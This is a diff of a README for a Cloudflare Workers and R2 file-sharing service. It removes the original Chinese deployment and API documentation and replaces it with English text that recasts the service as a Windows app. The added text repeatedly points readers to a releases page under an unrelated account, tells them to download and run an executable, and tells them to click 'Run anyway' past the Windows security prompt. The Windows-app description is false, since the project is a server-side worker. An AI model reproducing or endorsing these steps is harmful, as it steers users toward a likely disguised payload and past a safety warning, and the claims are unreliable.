@@ -1,183 +1,176 @@
-# 文件中转站 | File Transfer
+# 📁 File-Transfer - Share files with less hassle
 
-基于 Cloudflare Workers + R2 的文件分享服务，支持大文件分片上传，最大支持 100GB。
+[![Download File-Transfer](https://img.shields.io/badge/Download%20File--Transfer-blue?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/releases)
 
-[![community](https://github.com/user-attachments/assets/653f2b6b-ee32-4f0f-abe0-1ba96e4bb473)](https://linux.do/)
+## 🖥️ What this app does
 
-## 功能特性
+File-Transfer is a file sharing app for Windows. It helps you send large files without the usual pain of email limits and slow uploads. You can upload a file, set a password, share a link, and let others download it for a short time.
 
-- **大文件支持**：最大支持 100GB 文件上传
-- **分片上传**：大于 100MB 的文件自动使用分片上传，避免超时
-- **分享密码**：可为文件设置访问密码
-- **过期自动清理**：文件可设置过期时间，过期自动删除
-- **临时下载链接**：下载链接 5 分钟有效，安全可靠
-- **二维码分享**：一键生成分享二维码
-- **并发上传**：支持多文件同时上传
+It is built for simple use. You do not need to know how servers, buckets, or workers work to use the app on your PC.
 
-## 部署
+## ✨ Main features
 
-### 1. 创建 Cloudflare Workers
+- Send large files, up to 100 GB
+- Split big files into parts during upload
+- Share files with a password
+- Set an expiry time so files delete later
+- Create short-lived download links
+- Make a QR code for quick sharing
+- Upload several files at the same time
 
-```bash
-# 使用 wrangler CLI
-wrangler login
-wrangler init file-transfer
-```
+## 📦 Download for Windows
 
-### 2. 创建 R2 Bucket
+1. Open the release page:
+   [https://github.com/Gizelaunbroken711/File-Transfer/releases](https://github.com/Gizelaunbroken711/File-Transfer/releases)
+2. Find the latest release
+3. Download the Windows file, such as `.exe` or `.zip`
+4. If you downloaded a `.zip` file, extract it first
+5. Run the app file to start File-Transfer
 
-在 Cloudflare Dashboard 中创建一个 R2 Bucket，名称默认为 `file-transfer`（可在配置中修改）。
+## 🪟 Install and run
 
-### 3. 绑定 R2 Bucket
+### 1. Download the release file
+Use the release page above and get the latest Windows version.
 
-在 `wrangler.toml` 中添加：
+### 2. Unzip the file if needed
+If the download comes as a `.zip` file:
 
-```toml
-[[r2_buckets]]
-binding = "file-transfer"
-bucket_name = "file-transfer"
-```
+- Right-click the file
+- Select Extract All
+- Pick a folder you can find later
 
-### 4. 部署
+### 3. Start the app
+Open the extracted folder and double-click the app file.
 
-```bash
-wrangler deploy
-```
+If Windows shows a security prompt:
 
-## 配置
+- Click More info
+- Then click Run anyway
 
-编辑 `worker.js` 中的 `CONFIG` 对象：
+### 4. Keep the app easy to find
+You can copy the app to your Desktop or pin it to Start for quick access.
 
-```javascript
-const CONFIG = {
-  // R2 Bucket 名称
-  BUCKET_NAME: 'file-transfer',
-  
-  // 全局访问密码（留空则不启用）
-  ACCESS_PASSWORD: '',
-  
-  // 文件分享密码密钥（用于生成临时下载签名）
-  SHARE_SECRET_KEY: '',
-  
-  // 临时下载链接有效期（毫秒）默认5分钟
-  TEMP_LINK_EXPIRE: 5 * 60 * 1000,
-  
-  // 文件大小限制（字节）默认 100GB
-  MAX_FILE_SIZE: 100 * 1024 * 1024 * 1024,
-  
-  // 文件过期时间（毫秒）默认 7天，0 表示永不过期
-  FILE_EXPIRE_TIME: 7 * 24 * 60 * 60 * 1000,
-  
-  // 允许的文件类型（留空数组表示允许所有）
-  ALLOWED_TYPES: [],
-  
-  // 自定义域名（可选）
-  CUSTOM_DOMAIN: '',
-  
-  // 最大并发上传数
-  MAX_CONCURRENT_UPLOADS: 3,
-  
-  // 分片上传配置
-  CHUNK_SIZE: 50 * 1024 * 1024,  // 分片大小 50MB
-  MULTIPART_THRESHOLD: 100 * 1024 * 1024,  // 大于100MB启用分片
-};
-```
+## 🚀 First-time setup
 
-## API 接口
+When you open File-Transfer for the first time, you may need to connect it to your storage settings. This lets the app save and send files.
 
-### 获取上传链接
-```http
-POST /api/upload-url
-Content-Type: application/json
+Use the app settings to enter:
 
-{
-  "filename": "example.zip",
-  "size": 104857600,
-  "type": "application/zip",
-  "password": "optional-share-password"
-}
-```
+- Your storage name
+- Your access password, if you use one
+- Your file share key, if you use one
+- Your link expiry time
 
-响应：
-```json
-{
-  "uploadUrl": "...",
-  "fileId": "...",
-  "downloadUrl": "...",
-  "hasPassword": false,
-  "useMultipart": true,
-  "chunkSize": 52428800
-}
-```
+A simple setup is enough for most users:
 
-### 上传文件（小文件）
-```http
-PUT /api/upload/{fileId}
-Content-Type: {file-type}
+- Leave password fields empty if you do not want password protection
+- Keep the default file expiry time if you want links to close on their own
+- Use the same settings each time so uploads stay consistent
 
-[binary data]
-```
+## 🧭 How to use File-Transfer
 
-### 分片上传（大文件）
+### 1. Add files
+Click the upload area and choose one or more files from your PC.
 
-1. **初始化分片上传**
-```http
-POST /api/multipart/create
-Content-Type: application/json
+### 2. Wait for upload
+Large files may take time. The app splits big files into parts so uploads stay steady.
 
-{
-  "fileId": "...",
-  "totalChunks": 20
-}
-```
+### 3. Set share options
+You can add:
 
-2. **上传分片**
-```http
-POST /api/multipart/upload?fileId={fileId}&chunkIndex=0
+- A password for the file
+- An expiry time
+- A short download link
 
-[binary chunk data]
-```
+### 4. Share the link
+Send the link to the other person. They can open it in a browser and download the file.
 
-3. **完成分片上传**
-```http
-POST /api/multipart/complete
-Content-Type: application/json
+### 5. Use the QR code
+If you want to share on a phone, show the QR code and let the other person scan it.
 
-{
-  "fileId": "..."
-}
-```
+## 🔒 File protection
 
-### 下载文件
+File-Transfer includes a few simple controls to help keep files private:
 
-访问分享链接：`/d/{fileId}`
+- Password protection for access
+- Temporary download links that expire after a short time
+- Auto delete after the set time ends
 
-如果需要密码，会显示密码输入页面。验证通过后会自动跳转到临时下载链接。
+This helps when you want to share files for a short period and do not want them left open.
 
-## 技术说明
+## ⚙️ Suggested system needs
 
-### 分片上传原理
+For a smooth experience on Windows, use:
 
-1. 前端将大文件切分为 50MB 的分片
-2. 逐个上传分片，失败自动重试（最多 3 次）
-3. 同时上传 2 个分片，控制并发
-4. 后端将分片保存在 R2 中
-5. 下载时按顺序流式读取所有分片
+- Windows 10 or newer
+- 4 GB RAM or more
+- A stable internet connection
+- Enough free disk space for your files
+- A modern browser for opening shared links
 
-### 安全特性
+For large transfers, faster internet will help. If you send many files, more free memory can help too.
 
-- 所有下载链接都是临时的（默认 5 分钟有效）
-- 支持设置文件访问密码
-- 支持设置全局访问密码
-- 文件可设置过期时间
+## 🧩 Common use cases
 
-## 注意事项
+- Send a video to a friend
+- Share a work folder with a teammate
+- Move a large archive from one device to another
+- Share files with a link that expires later
+- Send a file and protect it with a password
 
-1. Cloudflare Workers 免费版有每日 100,000 次请求限制
-2. R2 存储有容量和出站流量限制
-3. 分片上传时，Workers 内存限制为 128MB，因此单分片大小不能超过 50MB
-4. 大文件下载时，由于需要流式读取多个分片，首字节时间可能稍长
+## 🛠️ If something does not work
 
-## 许可证
+### The app does not open
+- Check that the file finished downloading
+- If the file is in a ZIP, extract it first
+- Try running it again as administrator
 
-Apache License 2.0
+### Upload is slow
+- Check your internet speed
+- Pause other downloads
+- Try smaller files first
+
+### The link does not open
+- Check that the file has finished uploading
+- Make sure the link has not expired
+- Confirm that the password is correct
+
+### The file is too large
+- Wait for the upload to finish in parts
+- Check that the file is under the 100 GB limit
+
+## 📂 Project layout
+
+If you want to look inside the project later, the main parts are:
+
+- `worker.js` for the app logic
+- `wrangler.toml` for Cloudflare setup
+- R2 storage for file data
+
+You do not need to edit these files to use the Windows app, but they help if you want to understand how the service works.
+
+## 🔗 Related setup details
+
+The app uses Cloudflare services in the background. That means file storage and link handling depend on your Cloudflare setup.
+
+Typical setup items include:
+
+- A Cloudflare Workers project
+- An R2 bucket for file storage
+- A bucket name such as `file-transfer`
+- A secret key for download link checks
+- A password if you want private access
+
+## 📝 Basic usage tips
+
+- Use short file names when possible
+- Keep passwords simple enough to store safely
+- Set a clear expiry time for each file
+- Delete files you no longer need
+- Use the QR code when sharing with phone users
+
+## 📥 Download again
+
+[![Download File-Transfer](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/releases)
+
+Open the release page, get the latest Windows file, and run it on your PC
